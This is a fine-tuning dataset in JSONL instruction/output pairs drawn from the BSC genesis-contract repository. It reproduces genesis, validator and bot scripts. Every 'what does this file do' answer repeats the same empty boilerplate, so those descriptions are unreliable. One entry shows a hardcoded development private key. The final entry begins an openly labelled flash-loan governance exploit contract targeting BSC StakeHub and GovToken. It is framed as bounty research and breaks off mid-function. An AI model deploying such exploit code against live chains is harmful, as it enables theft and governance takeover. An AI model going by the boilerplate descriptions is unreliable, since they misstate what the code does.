\"unsafe\", ccs))\n    unsafe.sort(key=CmpCheatcode)\n    assert len(safe) + len(unsafe) == len(ccs)\n\n    prefix_with_group_headers(safe)\n    prefix_with_group_headers(unsafe)\n\n    out = \"\"\n\n    out += \"// Automatically @generated by scripts/vm.py. Do not modify manually.\\n\\n\"\n\n    pp = CheatcodesPrinter(\n     \n```", "output": "This file `vm.py` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for generate-genesis.js which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\generate-genesis.js`:\n\n```js\nconst program = require('commander');\nconst nunjucks = require('nunjucks');\nconst fs = require('fs');\nconst web3 = require('web3');\n\nconst validators = require('./validators');\nconst init_holders = require('./init_holders');\n\nprogram.version('0.0.1');\nprogram.option('-c, --chainId <chainId>', 'chain id', '714');\nprogram.option('-o, --output <output-file>', 'Genesis json file', './genesis.json');\nprogram.option('-t, --template <template>', 'Genesis template json', './genesis-template.json');\nprogram.option(\n  '--initLockedBNBOnTokenHub <initLockedBNBOnTokenHub>',\n  'initLockedBNBOnTokenHub',\n  '176405560900000000000000000'\n);\nprogram.parse(process.argv);\n\n// get byte code from compiled contract\nfunction readByteCode(key, contractFile) {\n  return new Promise((resolve, reject) => {\n    fs.readFile(`${contractFile}`, 'utf8', (err, data) => {\n      if (err) {\n        reject(new Error('Error reading file: ' + err.message));\n        return;\n      }\n\n      try {\n        const jsonObj = JSON.parse(data);\n        const compiledData = jsonObj['deployedBytecode']['object'];\n\n        resolve({\n          key: key,\n          compiledData: compiledData,\n        });\n      } catch (parseError) {\n        reject(new Error('Error parsing JSON: ' + parseError.message));\n      }\n    });\n  });\n}\n\n// compile files\nPromise.all([\n  readByteCode('validatorContract', 'out/BSCValidatorSet.sol/BSCValidatorSet.json'),\n  readByteCode('systemRewardContract', 'out/SystemReward.sol/SystemReward.json'),\n  readByteCode('slashContract', 'out/SlashIndicator.sol/SlashIndicator.json'),\n  readByteCode('tendermintLightClient', 'out/TendermintLightClient.sol/TendermintLightClient.json'),\n  readByteCode('tokenHub', 'out/TokenHub.sol/TokenHub.json'),\n  readByteCode('relayerHub', 'out/RelayerHub.sol/RelayerHub.json'),\n  readByteCode('relayerIncentivize', 'out/RelayerIncentivize.sol/RelayerIncentivize.json'),\n  readByteCode('govHub', 'out/GovHub.sol/GovHub.json'),\n  readByteCode('tokenManager', 'out/TokenManager.sol/TokenManager.json'),\n  readByteCode('crossChain', 'out/CrossChain.sol/CrossChain.json'),\n  readByteCode('staking', 'out/Staking.sol/Staking.json'),\n  readByteCode('stakeHub', 'out/StakeHub.sol/StakeHub.json'),\n  readByteCode('stakeCredit', 'out/StakeCredit.sol/StakeCredit.json'),\n  readByteCode('governor', 'out/BSCGovernor.sol/BSCGovernor.json'),\n  readByteCode('govToken', 'out/GovToken.sol/GovToken.json'),\n  readByteCode('timelock', 'out/BSCTimelock.sol/BSCTimelock.json'),\n  readByteCode('tokenRecoverPortal', 'out/TokenRecoverPortal.sol/TokenRecoverPortal.json'),\n]).then((result) => {\n  const data = {\n    initLockedBNBOnTokenHub: program.initLockedBNBOnTokenHub,\n    chainId: program.chainId,\n    initHolders: init_holders,\n    extraData: web3.utils.bytesToHex(validators.extraValidatorBytes),\n  };\n\n  result.forEach((r) => {\n    data[r.key] = r.compiledData;\n  });\n\n  const templateString = fs.readFileSync(program.template).toString();\n  const resultString = nunjucks.renderString(templateString, data);\n  fs.writeFileSync(program.output, resultString);\n});\n\n```"}
{"instruction": "What does the file generate-genesis.js do?", "input": "```js\nconst program = require('commander');\nconst nunjucks = require('nunjucks');\nconst fs = require('fs');\nconst web3 = require('web3');\n\nconst validators = require('./validators');\nconst init_holders = require('./init_holders');\n\nprogram.version('0.0.1');\nprogram.option('-c, --chainId <chainId>', 'chain id', '714');\nprogram.option('-o, --output <output-file>', 'Genesis json file', './genesis.json');\nprogram.option('-t, --template <template>', 'Genesis template json', './genesis-template.json');\nprogram.option(\n  '--initLockedBNBOnTokenHub <initLockedBNBOnTokenHub>',\n  'initLockedBNBOnTokenHub',\n  '176405560900000000000000000'\n);\nprogram.parse(process.argv);\n\n// get byte code from compiled contract\nfunction readByteCode(key, contractFile) {\n  return new Promise((resolve, reject) => {\n    fs.readFile(`${contractFile}`, 'utf8', (err, data) => {\n      if (err) {\n        reject(new Error('Error reading file: ' + err.message));\n        return;\n      }\n\n      try {\n        const jsonObj = JSON.parse(data);\n        const compiledData = jsonObj['deployedBytecode']['object'];\n\n        resolve({\n          key: key,\n          compiledData: compiledData,\n        });\n      } catch (parseError) {\n        reject(new Error('Error parsing JSON: ' + parseError.message));\n      }\n    });\n  });\n}\n\n// compile files\nPromise.all([\n  readByteCode('validatorContract', 'out/BSCValidatorSet.sol/BSCValidatorSet.json'),\n  readByteCode('systemRewardContract', 'out/SystemReward.sol/SystemReward.json'),\n  readByteCode('slashContract', 'out/SlashIndicator.sol/SlashIndicator.json'),\n  readByteCode('tendermintLightClient', 'out/TendermintLightClient.sol/TendermintLightClient.json'),\n  readByteCode('tokenHub', 'out/TokenHub.sol/TokenHub.json'),\n  readByteCode('relayerHub', 'out/RelayerHub.sol/RelayerHub.json'),\n  readByteCode('relayerIncentivize', 'out/RelayerIncentivize.sol/RelayerIncentivize.json'),\n  readByteCode('govHub', 'out/GovHub.sol/GovHub.json'),\n  readByteCode('tokenManager', 'out/TokenManager.s\n```", "output": "This file `generate-genesis.js` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for init_holders.js which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\init_holders.js`:\n\n```js\nconst init_holders = [\n  {\n    // private key is 0x9b28f36fbd67381120752d6172ecdcf10e06ab2d9a1367aac00cdcd6ac7855d3, only use in dev\n    address: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    balance: BigInt('10000000000000000000000000').toString(16),\n  },\n];\n\nexports = module.exports = init_holders;\n\n```"}
{"instruction": "What does the file init_holders.js do?", "input": "```js\nconst init_holders = [\n  {\n    // private key is 0x9b28f36fbd67381120752d6172ecdcf10e06ab2d9a1367aac00cdcd6ac7855d3, only use in dev\n    address: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    balance: BigInt('10000000000000000000000000').toString(16),\n  },\n];\n\nexports = module.exports = init_holders;\n\n```", "output": "This file `init_holders.js` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for validators.js which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\validators.js`:\n\n```js\nconst web3 = require('web3');\nconst RLP = require('rlp');\n\n// Configure\nconst validators = [\n  {\n    consensusAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    feeAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    bscFeeAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    votingPower: 0x0000000000000064,\n  },\n];\nconst bLSPublicKeys = [\n  '0x85e6972fc98cd3c81d64d40e325acfed44365b97a7567a27939c14dbc7512ddcf54cb1284eb637cfa308ae4e00cb5588',\n];\n\n// ======== Do not edit below ========\nfunction generateExtraData(validators) {\n  let extraVanity = Buffer.alloc(32);\n  let validatorsBytes = extraDataSerialize(validators);\n  let extraSeal = Buffer.alloc(65);\n  return Buffer.concat([extraVanity, validatorsBytes, extraSeal]);\n}\n\nfunction extraDataSerialize(validators) {\n  let n = validators.length;\n  let arr = [];\n  for (let i = 0; i < n; i++) {\n    let validator = validators[i];\n    arr.push(Buffer.from(web3.utils.hexToBytes(validator.consensusAddr)));\n  }\n  return Buffer.concat(arr);\n}\n\nfunction validatorUpdateRlpEncode(validators, bLSPublicKeys) {\n  let n = validators.length;\n  let vals = [];\n  for (let i = 0; i < n; i++) {\n    vals.push([\n      validators[i].consensusAddr,\n      validators[i].bscFeeAddr,\n      validators[i].feeAddr,\n      validators[i].votingPower,\n      bLSPublicKeys[i],\n    ]);\n  }\n  let pkg = [0x00, vals];\n  return web3.utils.bytesToHex(RLP.encode(pkg));\n}\n\nextraValidatorBytes = generateExtraData(validators);\nvalidatorSetBytes = validatorUpdateRlpEncode(validators, bLSPublicKeys);\n\nexports = module.exports = {\n  extraValidatorBytes: extraValidatorBytes,\n  validatorSetBytes: validatorSetBytes,\n};\n\n```"}
{"instruction": "What does the file validators.js do?", "input": "```js\nconst web3 = require('web3');\nconst RLP = require('rlp');\n\n// Configure\nconst validators = [\n  {\n    consensusAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    feeAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    bscFeeAddr: '0x9fB29AAc15b9A4B7F17c3385939b007540f4d791',\n    votingPower: 0x0000000000000064,\n  },\n];\nconst bLSPublicKeys = [\n  '0x85e6972fc98cd3c81d64d40e325acfed44365b97a7567a27939c14dbc7512ddcf54cb1284eb637cfa308ae4e00cb5588',\n];\n\n// ======== Do not edit below ========\nfunction generateExtraData(validators) {\n  let extraVanity = Buffer.alloc(32);\n  let validatorsBytes = extraDataSerialize(validators);\n  let extraSeal = Buffer.alloc(65);\n  return Buffer.concat([extraVanity, validatorsBytes, extraSeal]);\n}\n\nfunction extraDataSerialize(validators) {\n  let n = validators.length;\n  let arr = [];\n  for (let i = 0; i < n; i++) {\n    let validator = validators[i];\n    arr.push(Buffer.from(web3.utils.hexToBytes(validator.consensusAddr)));\n  }\n  return Buffer.concat(arr);\n}\n\nfunction validatorUpdateRlpEncode(validators, bLSPublicKeys) {\n  let n = validators.length;\n  let vals = [];\n  for (let i = 0; i < n; i++) {\n    vals.push([\n      validators[i].consensusAddr,\n      validators[i].bscFeeAddr,\n      validators[i].feeAddr,\n      validators[i].votingPower,\n      bLSPublicKeys[i],\n    ]);\n  }\n  let pkg = [0x00, vals];\n  return web3.utils.bytesToHex(RLP.encode(pkg));\n}\n\nextraValidatorBytes = generateExtraData(validators);\nvalidatorSetBytes = validatorUpdateRlpEncode(validators, bLSPublicKeys);\n\nexports = module.exports = {\n  extraValidatorBytes: extraValidatorBytes,\n  validatorSetBytes: validatorSetBytes,\n};\n\n```", "output": "This file `validators.js` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for bep171-unlock-bot.ts which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\bep171-unlock-bot.ts`:\n\n```ts\nimport { ethers } from \"ethers\";\nimport 'dotenv/config';\n\nconst log = console.log;\n\nconst TOKEN_HUB = '0x0000000000000000000000000000000000001004'\nconst unlockReceiver = process.env.UNLOCK_RECEIVER as string;\nconst operatorPrivateKey = process.env.OPERATOR_PRIVATE_KEY as string;\n\nconst BSC_RPC_URL = \"https://bsc-dataseed2.ninicoin.io\";\nconst provider = new ethers.JsonRpcProvider(BSC_RPC_URL);\n\nconst wallet = new ethers.Wallet(operatorPrivateKey, provider)\n\n// TokenHub\nconst abiTokenHub = [\n    \"function withdrawUnlockedToken(address tokenAddress, address recipient) external\",\n];\n\nconst work = async () => {\n    log('start work', wallet.address)\n    const tokenHub = new ethers.Contract(TOKEN_HUB, abiTokenHub, wallet)\n\n    while (true) {\n        try {\n            log(new Date().toString(), \"try to withdrawUnlockedToken for\", unlockReceiver)\n            const tx = await tokenHub.withdrawUnlockedToken(ethers.ZeroAddress, unlockReceiver);\n            await tx.wait(1);\n        } catch (e) {\n            log('error', e);\n        }\n        await sleep(10)\n    }\n};\n\nconst sleep = async (seconds: number) => {\n    console.log('sleep', seconds, 's');\n    await new Promise((resolve) => setTimeout(resolve, seconds * 1000));\n};\n\nconst main = async () => {\n    await work();\n};\n\nmain()\n    .then(() => process.exit(0))\n    .catch((error) => {\n        console.error(error);\n        process.exit(1);\n    });\n\n```"}
{"instruction": "What does the file bep171-unlock-bot.ts do?", "input": "```ts\nimport { ethers } from \"ethers\";\nimport 'dotenv/config';\n\nconst log = console.log;\n\nconst TOKEN_HUB = '0x0000000000000000000000000000000000001004'\nconst unlockReceiver = process.env.UNLOCK_RECEIVER as string;\nconst operatorPrivateKey = process.env.OPERATOR_PRIVATE_KEY as string;\n\nconst BSC_RPC_URL = \"https://bsc-dataseed2.ninicoin.io\";\nconst provider = new ethers.JsonRpcProvider(BSC_RPC_URL);\n\nconst wallet = new ethers.Wallet(operatorPrivateKey, provider)\n\n// TokenHub\nconst abiTokenHub = [\n    \"function withdrawUnlockedToken(address tokenAddress, address recipient) external\",\n];\n\nconst work = async () => {\n    log('start work', wallet.address)\n    const tokenHub = new ethers.Contract(TOKEN_HUB, abiTokenHub, wallet)\n\n    while (true) {\n        try {\n            log(new Date().toString(), \"try to withdrawUnlockedToken for\", unlockReceiver)\n            const tx = await tokenHub.withdrawUnlockedToken(ethers.ZeroAddress, unlockReceiver);\n            await tx.wait(1);\n        } catch (e) {\n            log('error', e);\n        }\n        await sleep(10)\n    }\n};\n\nconst sleep = async (seconds: number) => {\n    console.log('sleep', seconds, 's');\n    await new Promise((resolve) => setTimeout(resolve, seconds * 1000));\n};\n\nconst main = async () => {\n    await work();\n};\n\nmain()\n    .then(() => process.exit(0))\n    .catch((error) => {\n        console.error(error);\n        process.exit(1);\n    });\n\n```", "output": "This file `bep171-unlock-bot.ts` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for check-bsc-hardfork-bytecode.ts which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\check-bsc-hardfork-bytecode.ts`:\n\n```ts\nimport 'dotenv/config';\nimport {execSync} from 'child_process';\nimport * as fs from \"fs\";\nimport * as fsp from 'fs/promises';\nimport * as path from \"node:path\";\n\nconst log = console.log;\n\nlet contractNameMap: any = {}\nconst VALIDATOR_CONTRACT_ADDR = '0x0000000000000000000000000000000000001000';\ncontractNameMap[VALIDATOR_CONTRACT_ADDR] = 'ValidatorContract'\n\nconst SLASH_CONTRACT_ADDR = '0x0000000000000000000000000000000000001001';\ncontractNameMap[SLASH_CONTRACT_ADDR] = 'SlashContract'\n\nconst SYSTEM_REWARD_ADDR = '0x0000000000000000000000000000000000001002';\ncontractNameMap[SYSTEM_REWARD_ADDR] = 'SystemRewardContract'\n\nconst LIGHT_CLIENT_ADDR = '0x0000000000000000000000000000000000001003';\ncontractNameMap[LIGHT_CLIENT_ADDR] = 'LightClientContract'\n\nconst TOKEN_HUB_ADDR = '0x0000000000000000000000000000000000001004';\ncontractNameMap[TOKEN_HUB_ADDR] = 'TokenHubContract'\n\nconst INCENTIVIZE_ADDR = '0x0000000000000000000000000000000000001005';\ncontractNameMap[INCENTIVIZE_ADDR] = 'RelayerIncentivizeContract'\n\nconst RELAYERHUB_CONTRACT_ADDR = '0x0000000000000000000000000000000000001006';\ncontractNameMap[RELAYERHUB_CONTRACT_ADDR] = 'RelayerHubContract'\n\nconst GOV_HUB_ADDR = '0x0000000000000000000000000000000000001007';\ncontractNameMap[GOV_HUB_ADDR] = 'GovHubContract'\n\nconst TOKEN_MANAGER_ADDR = '0x0000000000000000000000000000000000001008';\ncontractNameMap[TOKEN_MANAGER_ADDR] = 'TokenManagerContract'\n\nconst CROSS_CHAIN_CONTRACT_ADDR = '0x0000000000000000000000000000000000002000';\ncontractNameMap[CROSS_CHAIN_CONTRACT_ADDR] = 'CrossChainContract'\n\nconst STAKING_CONTRACT_ADDR = '0x0000000000000000000000000000000000002001';\ncontractNameMap[STAKING_CONTRACT_ADDR] = 'StakingContract'\n\nconst STAKE_HUB_ADDR = '0x0000000000000000000000000000000000002002';\ncontractNameMap[STAKE_HUB_ADDR] = 'StakeHubContract'\n\nconst STAKE_CREDIT_ADDR = '0x0000000000000000000000000000000000002003';\ncontractNameMap[STAKE_CREDIT_ADDR] = 'StakeCreditContract'\n\nconst GOVERNOR_ADDR = '0x0000000000000000000000000000000000002004';\ncontractNameMap[GOVERNOR_ADDR] = 'GovernorContract'\n\nconst GOV_TOKEN_ADDR = '0x0000000000000000000000000000000000002005';\ncontractNameMap[GOV_TOKEN_ADDR] = 'GovTokenContract'\n\nconst TIMELOCK_ADDR = '0x0000000000000000000000000000000000002006';\ncontractNameMap[TIMELOCK_ADDR] = 'TimelockContract'\n\nconst TOKEN_RECOVER_PORTAL_ADDR = '0x0000000000000000000000000000000000003000';\ncontractNameMap[TOKEN_RECOVER_PORTAL_ADDR] = 'TokenRecoverPortalContract'\n\nlet hardforkName = process.env.HARDFORK\nlet bscUrl = process.env.BSC_URL\nlet bscRepoDir = '/tmp/bsc'\n\nconst checkHardforkBytecode = async () => {\n  const bscHardforkBytecodeDir = bscRepoDir + '/core/systemcontracts/' + hardforkName\n  const mainnetDir = bscHardforkBytecodeDir + '/mainnet'\n  const testnetDir = bscHardforkBytecodeDir + '/chapel'\n\n  log('---------------------------------------------------------------------------')\n  log(`Mainnet: compare genesis bytecode with bsc repo`)\n  const mainnetHardforkFiles = await searchFiles(mainnetDir, 'Contract')\n  if (mainnetHardforkFiles.length === 0) {\n    throw new Error(`cannot find any files in ${mainnetDir}`)\n  }\n  const mainnetGenesis = __dirname + '/../genesis.json'\n  await compareGenesisWithHardforkBytecodes(mainnetGenesis, mainnetHardforkFiles)\n\n  log('---------------------------------------------------------------------------')\n  log(`Testnet: compare genesis bytecode with bsc repo`)\n  const testnetHardforkFiles = await searchFiles(testnetDir, 'Contract')\n  if (testnetHardforkFiles.length === 0) {\n    throw new Error(`cannot find any files in ${testnetDir}`)\n  }\n  const testnetGenesis = __dirname + '/../genesis-testnet.json'\n  await compareGenesisWithHardforkBytecodes(testnetGenesis, testnetHardforkFiles)\n};\n\nconst compareGenesisWithHardforkBytecodes = async (genesisFile: string, files: string[]) => {\n  const genesis: any = require(genesisFile)\n  for (const addr in genesis['alloc']) {\n    if (!genesis['alloc'][addr]['code']) {\n      continue;\n    }\n\n    const contractName = contractNameMap[addr]\n    const bytecode = clear0x(genesis['alloc'][addr]['code'])\n\n    log('---------------------------------------------------------------------------')\n    log(contractName, addr)\n    log('bytecode from genesis:', bytecode.length, )\n\n    const bytecodeFromBsc = getBytecodeFromBscRepo(contractName, files)\n    if (!bytecodeFromBsc) {\n      log(`cannot find bytecode for ${contractName} in bsc repo`)\n      continue;\n    }\n\n    log('bytecode from bsc repo:', bytecodeFromBsc.length, )\n\n    if (bytecode === bytecodeFromBsc) {\n      log('Success!')\n    } else {\n      throw new Error(`bytecode not match for ${contractName}`)\n    }\n  }\n}\n\nconst getBytecodeFromBscRepo = (contractName: string, files: string[]): string | undefined => {\n  for (let i = 0; i < files.length; i++) {\n    const file = files[i]\n    if (file.includes(`/${contractName}`)) {\n      return clear0x((fs.readFileSync(file)).toString());\n    }\n  }\n  return undefined\n}\n\nconst searchFiles = async (searchDir: string, searchSuffix = ''): Promise<string[]> => {\n  let fileList: string[] = []\n  try {\n    const files = await fsp.readdir(searchDir);\n\n    for (const file of files) {\n      const filePath = path.join(searchDir, file);\n      const stats = await fsp.stat(filePath);\n\n      // recursive search\n      if (stats.isDirectory()) {\n        fileList = fileList.concat(await searchFiles(filePath));\n      } else {\n        if (searchSuffix.length > 0 && filePath.endsWith(searchSuffix)) {\n          // success find target file which ends with searchSuffix\n          fileList.push(filePath)\n        }\n      }\n    }\n  } catch (err) {\n    console.error(`!! Error reading directory ${searchDir}:`, err);\n  }\n\n  return fileList;\n}\n\nconst clear0x = (str: string) => {\n  if (str.startsWith('0x')) return str.substring(2)\n  return str\n};\n\nconst main = async () => {\n\n  if (!hardforkName) {\n    throw new Error('HARDFORK is required in .env')\n  }\n\n  if (!bscUrl) {\n    throw new Error('BSC_URL is required in .env')\n  }\n\n  hardforkName = hardforkName.trim()\n  bscUrl = bscUrl.trim()\n\n  const p= bscUrl.lastIndexOf('/')\n  const commitId = bscUrl.substring(p+1)\n\n  log('hardforkName', hardforkName, 'commitId', commitId)\n\n  execSync(`cd /tmp && git clone https://github.com/bnb-chain/bsc.git && cd bsc && git checkout ${commitId}`)\n\n  await sleep(5)\n\n  await checkHardforkBytecode();\n\n  log('All bytecode match!')\n};\n\nconst sleep = async (seconds: number) => {\n  console.log('sleep', seconds, 's');\n  await new Promise((resolve) => setTimeout(resolve, seconds * 1000));\n};\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error);\n    process.exit(1);\n  });\n\n\n```"}
{"instruction": "What does the file check-bsc-hardfork-bytecode.ts do?", "input": "```ts\nimport 'dotenv/config';\nimport {execSync} from 'child_process';\nimport * as fs from \"fs\";\nimport * as fsp from 'fs/promises';\nimport * as path from \"node:path\";\n\nconst log = console.log;\n\nlet contractNameMap: any = {}\nconst VALIDATOR_CONTRACT_ADDR = '0x0000000000000000000000000000000000001000';\ncontractNameMap[VALIDATOR_CONTRACT_ADDR] = 'ValidatorContract'\n\nconst SLASH_CONTRACT_ADDR = '0x0000000000000000000000000000000000001001';\ncontractNameMap[SLASH_CONTRACT_ADDR] = 'SlashContract'\n\nconst SYSTEM_REWARD_ADDR = '0x0000000000000000000000000000000000001002';\ncontractNameMap[SYSTEM_REWARD_ADDR] = 'SystemRewardContract'\n\nconst LIGHT_CLIENT_ADDR = '0x0000000000000000000000000000000000001003';\ncontractNameMap[LIGHT_CLIENT_ADDR] = 'LightClientContract'\n\nconst TOKEN_HUB_ADDR = '0x0000000000000000000000000000000000001004';\ncontractNameMap[TOKEN_HUB_ADDR] = 'TokenHubContract'\n\nconst INCENTIVIZE_ADDR = '0x0000000000000000000000000000000000001005';\ncontractNameMap[INCENTIVIZE_ADDR] = 'RelayerIncentivizeContract'\n\nconst RELAYERHUB_CONTRACT_ADDR = '0x0000000000000000000000000000000000001006';\ncontractNameMap[RELAYERHUB_CONTRACT_ADDR] = 'RelayerHubContract'\n\nconst GOV_HUB_ADDR = '0x0000000000000000000000000000000000001007';\ncontractNameMap[GOV_HUB_ADDR] = 'GovHubContract'\n\nconst TOKEN_MANAGER_ADDR = '0x0000000000000000000000000000000000001008';\ncontractNameMap[TOKEN_MANAGER_ADDR] = 'TokenManagerContract'\n\nconst CROSS_CHAIN_CONTRACT_ADDR = '0x0000000000000000000000000000000000002000';\ncontractNameMap[CROSS_CHAIN_CONTRACT_ADDR] = 'CrossChainContract'\n\nconst STAKING_CONTRACT_ADDR = '0x0000000000000000000000000000000000002001';\ncontractNameMap[STAKING_CONTRACT_ADDR] = 'StakingContract'\n\nconst STAKE_HUB_ADDR = '0x0000000000000000000000000000000000002002';\ncontractNameMap[STAKE_HUB_ADDR] = 'StakeHubContract'\n\nconst STAKE_CREDIT_ADDR = '0x0000000000000000000000000000000000002003';\ncontractNameMap[STAKE_CREDIT_ADDR] = 'StakeCreditContract'\n\nconst GOVERNOR_ADDR = '0x00000000000000000000000\n```", "output": "This file `check-bsc-hardfork-bytecode.ts` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for check-genesis-bytecode.ts which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\check-genesis-bytecode.ts`:\n\n```ts\nimport 'dotenv/config';\nimport {execSync} from 'child_process';\nimport * as assert from \"assert\";\nimport * as fs from \"fs\";\n\nconst log = console.log;\n\nconst work = async () => {\n  log('compare current bytecode with latest mainnet contracts')\n  let str = (fs.readFileSync(__dirname + '/../genesis.json')).toString();\n  const currentGenesis = JSON.parse(str);\n  log('currentGenesis size:', JSON.stringify(currentGenesis, null, 2).length)\n\n  const result = execSync('poetry run python -m scripts.generate mainnet')\n  const resultStr = result.toString()\n  if (resultStr.indexOf('Generate genesis of mainnet successfully') === -1) {\n    throw Error(`generate mainnet genesis failed, error result: ${resultStr}`)\n  }\n  await sleep(5)\n  log('generated mainnet genesis')\n\n  str = (fs.readFileSync(__dirname + '/../genesis.json')).toString();\n  const generatedGenesis = JSON.parse(str);\n  log('generatedGenesis size:', JSON.stringify(generatedGenesis, null, 2).length)\n\n  log('try deepStrictEqual(currentGenesis, generatedGenesis)')\n  assert.deepStrictEqual(currentGenesis, generatedGenesis)\n\n  log('Success! genesis bytecode not changed')\n};\n\nconst sleep = async (seconds: number) => {\n  console.log('sleep', seconds, 's');\n  await new Promise((resolve) => setTimeout(resolve, seconds * 1000));\n};\n\nconst main = async () => {\n  await work();\n};\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error);\n    process.exit(1);\n  });\n\n\n```"}
{"instruction": "What does the file check-genesis-bytecode.ts do?", "input": "```ts\nimport 'dotenv/config';\nimport {execSync} from 'child_process';\nimport * as assert from \"assert\";\nimport * as fs from \"fs\";\n\nconst log = console.log;\n\nconst work = async () => {\n  log('compare current bytecode with latest mainnet contracts')\n  let str = (fs.readFileSync(__dirname + '/../genesis.json')).toString();\n  const currentGenesis = JSON.parse(str);\n  log('currentGenesis size:', JSON.stringify(currentGenesis, null, 2).length)\n\n  const result = execSync('poetry run python -m scripts.generate mainnet')\n  const resultStr = result.toString()\n  if (resultStr.indexOf('Generate genesis of mainnet successfully') === -1) {\n    throw Error(`generate mainnet genesis failed, error result: ${resultStr}`)\n  }\n  await sleep(5)\n  log('generated mainnet genesis')\n\n  str = (fs.readFileSync(__dirname + '/../genesis.json')).toString();\n  const generatedGenesis = JSON.parse(str);\n  log('generatedGenesis size:', JSON.stringify(generatedGenesis, null, 2).length)\n\n  log('try deepStrictEqual(currentGenesis, generatedGenesis)')\n  assert.deepStrictEqual(currentGenesis, generatedGenesis)\n\n  log('Success! genesis bytecode not changed')\n};\n\nconst sleep = async (seconds: number) => {\n  console.log('sleep', seconds, 's');\n  await new Promise((resolve) => setTimeout(resolve, seconds * 1000));\n};\n\nconst main = async () => {\n  await work();\n};\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error);\n    process.exit(1);\n  });\n\n\n```", "output": "This file `check-genesis-bytecode.ts` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for FlashLoanGovernanceExploit.sol which is part of the exploits project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\exploits\\FlashLoanGovernanceExploit.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\n/**\n * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n * â•‘  ðŸŸª EXPLOIT: Flash Loan Governance Manipulation                           â•‘\n * â•‘  ðŸŸª TARGET: BSC Genesis Contract - GovToken + StakeHub                    â•‘\n * â•‘  ðŸŸª BOUNTY POTENTIAL: $75,000 - $100,000                                  â•‘\n * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n *\n * VULNERABILITY EXPLANATION:\n * --------------------------\n * The GovToken mints voting power based on staked BNB amount.\n * If an attacker can:\n * 1. Flash loan large amount of BNB\n * 2. Delegate to validator (get shares)\n * 3. Sync GovToken (get voting power)\n * 4. Vote on governance proposal\n * 5. Undelegate and repay flash loan\n *\n * The 7-day unbond period SHOULD prevent this, but we need to verify\n * there's no bypass via redelegate() or other mechanisms.\n *\n * WHY IT'S DANGEROUS:\n * - Could pass malicious governance proposals\n * - Drain treasury funds\n * - Modify critical protocol parameters\n * - Change system contract addresses\n */\n\ninterface IStakeHub {\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function undelegate(address operatorAddress, uint256 shares) external;\n    function redelegate(address src, address dst, uint256 shares, bool power) external;\n    function syncGovToken(address[] calldata operators, address account) external;\n}\n\ninterface IGovToken {\n    function balanceOf(address account) external view returns (uint256);\n    function getVotes(address account) external view returns (uint256);\n    function delegates(address account) external view returns (address);\n}\n\ninterface IBSCGovernor {\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n\n    function castVote(uint256 proposalId, uint8 support) external returns (uint256);\n    function proposalThreshold() external view returns (uint256);\n}\n\ninterface IFlashLoanProvider {\n    function flashLoan(address recipient, uint256 amount, bytes calldata data) external;\n}\n\n/**\n * @title FlashLoanGovernanceExploit\n * @dev Attempts to manipulate governance via flash loan\n */\ncontract FlashLoanGovernanceExploit {\n    IStakeHub public stakeHub;\n    IGovToken public govToken;\n    IBSCGovernor public governor;\n\n    address public targetValidator;\n    uint256 public proposalId;\n    bool public inFlashLoan;\n\n    event FlashLoanReceived(uint256 amount);\n    event VotingPowerAcquired(uint256 votes);\n    event ProposalCreated(uint256 proposalId);\n    event VoteCast(uint256 proposalId, uint256 weight);\n    event ExploitResult(bool success, string message);\n\n    constructor(\n        address _stakeHub,\n        address _govToken,\n        address _governor\n    ) {\n        stakeHub = IStakeHub(_stakeHub);\n        govToken = IGovToken(_govToken);\n        governor = IBSCGovernor(_governor);\n    }\n\n    /**\n     * @dev Main exploit entry point\n     * @param _targetValidator Validator to delegate to\n     * @param _proposalId Existing proposal to vote on (or 0 to create new)\n     * @param flashLoanAmount Amount to flash loan\n     */\n    function executeExploit(\n        address _targetValidator,\n        uint256 _proposalId,\n        uint256 flashLoanAmount\n    ) external payable {\n        targetValidator = _targetValidator;\n        proposalId = _proposalId;\n        inFlashLoan = true;\n\n        // Simulate flash loan 